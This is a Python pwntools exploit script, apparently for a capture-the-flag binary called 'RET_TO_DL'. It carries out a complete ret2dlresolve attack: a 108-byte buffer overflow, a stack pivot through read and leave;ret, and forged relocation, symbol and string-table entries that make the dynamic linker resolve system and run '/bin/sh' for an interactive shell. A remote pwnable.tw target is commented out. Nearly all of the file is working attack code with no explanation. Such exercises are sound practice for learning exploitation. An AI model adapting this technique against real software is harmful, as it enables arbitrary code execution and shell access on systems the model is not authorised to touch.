from pwn import *
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh' ,'-c']
name = './pwn'
p = process(name)
#p=remote('chall.pwnable.tw', 10103)
elf= ELF(name)
#libc = ELF('./libc_32.so.6')
if args.G:
    gdb.attach(p)
    
rel_plt_addr = elf.get_section_by_name('.rel.plt').header.sh_addr   #0x8048330
dynsym_addr =  elf.get_section_by_name('.dynsym').header.sh_addr    #0x80481d8
dynstr_addr = elf.get_section_by_name('.dynstr').header.sh_addr     #0x8048278
resolve_plt = 0x08048380
leave_ret_addr = 0x0804851d 
start = 0x804aa00

fake_rel_plt_addr = start
fake_dynsym_addr = fake_rel_plt_addr + 0x8
fake_dynstr_addr = fake_dynsym_addr + 0x10
bin_sh_addr = fake_dynstr_addr + 0x7

n = fake_rel_plt_addr - rel_plt_addr
r_info = (int((fake_dynsym_addr - dynsym_addr)/0x10) << 8) + 0x7
str_offset = fake_dynstr_addr - dynstr_addr


fake_rel_plt = p32(elf.got['read']) + p32(r_info)
fake_dynsym = p32(str_offset) + p32(0) + p32(0) + p32(0x12000000)
fake_dynstr = b"system\x00/bin/sh\x00\x00"


pay1 = b'a'*108 + p32(start - 20) + p32(elf.plt['read']) + p32(leave_ret_addr) + p32(0) + p32(start - 20) + p32(0x100)
p.recvuntil('Welcome to RET_TO_DL~!\n')
#p.recvuntil("Nice to meet you~!\n")
p.sendline(pay1)
sleep(1)
pay2 = p32(0x0) + p32(resolve_plt) + p32(n) + b'aaaa' + p32(bin_sh_addr) + fake_rel_plt + fake_dynsym + fake_dynstr
p.sendline(pay2)

success(".rel_plt: " + hex(rel_plt_addr))
success(".dynsym: " + hex(dynsym_addr))
success(".dynstr: " + hex(dynstr_addr))
success("fake_rel_plt_addr: " + hex(fake_rel_plt_addr))
success("fake_dynsym_addr: " + hex(fake_dynsym_addr))
success("fake_dynstr_addr: " + hex(fake_dynstr_addr))
success("n: " + hex(n))
success("r_info: " + hex(r_info))
success("offset: " + hex(str_offset))
success("system_addr: " + hex(fake_dynstr_addr))
success("bss_addr: " + hex(elf.bss()))
p.interactive()